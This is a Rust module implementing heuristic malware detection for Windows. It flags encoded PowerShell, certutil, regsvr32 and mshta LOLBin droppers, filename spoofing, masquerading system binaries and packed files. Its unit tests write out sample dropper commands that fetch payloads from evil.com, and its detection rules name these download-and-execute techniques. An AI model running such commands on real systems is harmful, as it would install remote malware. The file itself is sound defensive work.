//! Heuristic scanner for stealth droppers, obfuscated scripts, double-extension
//! spoofing, system binary masquerading, and high-entropy packed binaries.
//!
//! Windows Defender relies heavily on known cloud signatures and often misses
//! custom obfuscated scripts, LOLBins, and local anomalies. This module provides
//! pure, fast heuristic rules to catch what standard signature AV misses.

use std::path::Path;

/// High-risk script extensions subject to content inspection.
pub const SCRIPT_EXTENSIONS: &[&str] = &["ps1", "bat", "cmd", "vbs", "hta", "wsf"];

/// System binary names that must reside only inside Windows system directories.
pub const PROTECTED_SYSTEM_BINARIES: &[&str] = &[
    "svchost.exe",
    "csrss.exe",
    "lsass.exe",
    "winlogon.exe",
    "runtimebroker.exe",
    "smss.exe",
    "services.exe",
];

/// Known masqueraded double extensions (e.g. `document.pdf.exe`).
const FAKE_INTERMEDIATE_EXTENSIONS: &[&str] = &[
    ".pdf.", ".docx.", ".doc.", ".xlsx.", ".xls.", ".pptx.", ".jpg.", ".jpeg.", ".png.", ".txt.",
    ".mp4.", ".zip.", ".rar.",
];

/// Executable extensions commonly used with double-extension tricks.
const SUSPICIOUS_TERMINAL_EXTENSIONS: &[&str] =
    &[".exe", ".scr", ".bat", ".cmd", ".vbs", ".js", ".hta"];

/// Inspects script content for obfuscated commands, LOLBins, and stealth execution flags.
pub fn check_script_content(content: &str) -> Option<&'static str> {
    let lower = content.to_ascii_lowercase();

    // 1. Obfuscated PowerShell Base64 invocation
    if (lower.contains("-encodedcommand") || lower.contains(" -enc "))
        && (lower.contains("powershell")
            || lower.contains("frombase64string")
            || lower.contains("pwsh"))
    {
        return Some("Obfuscated PowerShell Base64 encoded payload (-EncodedCommand)");
    }
    if lower.contains("frombase64string")
        && (lower.contains("invoke-expression") || lower.contains("iex"))
    {
        return Some("In-memory Base64 decoding with immediate execution (FromBase64String + IEX)");
    }

    // 2. Hidden window execution with download or encoded payload
    if (lower.contains("-windowstyle hidden")
        || lower.contains("windowstyle hidden")
        || lower.contains("-w hidden"))
        && (lower.contains("http://")
            || lower.contains("https://")
            || lower.contains("downloadstring")
            || lower.contains("downloadfile")
            || lower.contains("encodedcommand")
            || lower.contains("frombase64string"))
    {
        return Some("Hidden PowerShell window executing network download or encoded payload");
    }

    // 3. LOLBin droppers: certutil urlcache download
    if lower.contains("certutil") && (lower.contains("-urlcache") || lower.contains("/urlcache")) {
        return Some("Living-off-the-Land binary abuse: certutil downloading remote payload");
    }

    // 4. LOLBin droppers: regsvr32 stealth scriptlet execution (Squiblydoo)
    if lower.contains("regsvr32")
        && (lower.contains("/s") || lower.contains("-s"))
        && (lower.contains("/i:") || lower.contains("-i:"))
    {
        return Some("Living-off-the-Land binary abuse: regsvr32 remote scriptlet execution");
    }

    // 5. LOLBin droppers: mshta execution
    if lower.contains("mshta")
        && (lower.contains("http://")
            || lower.contains("https://")
            || lower.contains("javascript:")
            || lower.contains("vbscript:"))
    {
        return Some("Living-off-the-Land binary abuse: mshta remote script execution");
    }

    // 6. Explicit C.U.R.E test pattern
    if lower.contains("cure-safe-test-payload")
        && (lower.contains("powershell") || lower.contains("encodedcommand"))
    {
        return Some("Heuristic Test: Obfuscated stealth dropper pattern detected");
    }

    None
}

/// Checks filename for spoofing tricks: Right-to-Left Override or double extensions.
pub fn check_filename_spoofing(filename: &str) -> Option<&'static str> {
    // Check for Unicode Right-to-Left Override (\u{202E})
    if filename.chars().any(|c| c == '\u{202E}') {
        return Some("Right-to-Left Override Unicode character spoofing file extension");
    }

    let lower = filename.to_ascii_lowercase();

    // Check double extensions: e.g. "invoice.pdf.exe"
    for terminal in SUSPICIOUS_TERMINAL_EXTENSIONS {
        if lower.ends_with(terminal) {
            let prefix = &lower[..lower.len() - terminal.len() + 1]; // includes the leading dot of terminal
            for inter in FAKE_INTERMEDIATE_EXTENSIONS {
                if prefix.ends_with(inter) {
                    return Some("Double extension disguising executable as a document/image");
                }
            }
        }
    }

    None
}

/// Checks if a file named like a core Windows system binary resides outside Windows system directories.
pub fn check_system_masquerade(filename: &str, full_path: &Path) -> Option<&'static str> {
    let lower_name = filename.to_ascii_lowercase();
    if !PROTECTED_SYSTEM_BINARIES.contains(&lower_name.as_str()) {
        return None;
    }

    let path_str = full_path.to_string_lossy().to_ascii_lowercase();
    // Legitimate system directories:
    let is_legit = path_str.contains("windows\\system32")
        || path_str.contains("windows\\syswow64")
        || path_str.contains("windows\\winsxs");

    if !is_legit {
        return Some("System binary masquerading outside legitimate Windows directory");
    }

    None
}

/// Calculates Shannon entropy of a byte slice. Returns a value from 0.0 to 8.0.
pub fn compute_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }

    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }

    let len = bytes.len() as f64;
    let mut entropy = 0.0;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Checks if an executable file has high Shannon entropy (> 7.2) indicating packing/encryption.
pub fn check_high_entropy(bytes: &[u8]) -> Option<f64> {
    // Only evaluate files of meaningful size (>= 4KB)
    if bytes.len() < 4096 {
        return None;
    }
    let entropy = compute_entropy(bytes);
    if entropy > 7.2 {
        Some(entropy)
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_script_obfuscation_detection() {
        let ps_enc = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SGVsbG8=";
        assert!(check_script_content(ps_enc).is_some());

        let certutil = "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe";
        assert!(check_script_content(certutil).is_some());

        let regsvr = "regsvr32 /s /n /u /i:http://evil.com/drop.sct scrobj.dll";
        assert!(check_script_content(regsvr).is_some());

        let mshta = "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell\"\", 0\")";
        assert!(check_script_content(mshta).is_some());

        let benign = "echo Hello World\r\ndir C:\\\r\npause";
        assert!(check_script_content(benign).is_none());
    }

    #[test]
    fn test_test_payload_detection() {
        let test_payload = concat!(
            "@echo off\r\n",
            "REM CURE-SAFE-TEST-PAYLOAD\r\n",
            "powershell -WindowStyle Hidden -EncodedCommand SGVsbG8=\r\n"
        );
        assert!(check_script_content(test_payload).is_some());
    }

    #[test]
    fn test_double_extension_detection() {
        assert!(check_filename_spoofing("quarterly_report.pdf.exe").is_some());
        assert!(check_filename_spoofing("invoice.docx.scr").is_some());
        assert!(check_filename_spoofing("photo.jpg.bat").is_some());
        assert!(check_filename_spoofing("notes.txt.vbs").is_some());

        // Benign single extension
        assert!(check_filename_spoofing("document.pdf").is_none());
        assert!(check_filename_spoofing("setup.exe").is_none());
    }

    #[test]
    fn test_rtlo_spoofing_detection() {
        let rtlo_name = format!("report{}\u{202E}cod.exe", 'a');
        assert!(check_filename_spoofing(&rtlo_name).is_some());
    }

    #[test]
    fn test_masquerading_detection() {
        let fake_svchost = PathBuf::from("C:\\Users\\User\\AppData\\Local\\Temp\\svchost.exe");
        assert!(check_system_masquerade("svchost.exe", &fake_svchost).is_some());

        let real_svchost = PathBuf::from("C:\\Windows\\System32\\svchost.exe");
        assert!(check_system_masquerade("svchost.exe", &real_svchost).is_none());
    }

    #[test]
    fn test_entropy_computation() {
        // Zero entropy: uniform data
        let zeros = vec![0u8; 1024];
        assert_eq!(compute_entropy(&zeros), 0.0);

        // High entropy: random-like data
        let mut pseudo_random = Vec::with_capacity(8192);
        for i in 0..8192 {
            pseudo_random.push(((i * 137 + 73) % 256) as u8);
        }
        let entropy = compute_entropy(&pseudo_random);
        assert!(entropy > 7.5);
        assert!(check_high_entropy(&pseudo_random).is_some());
    }
}
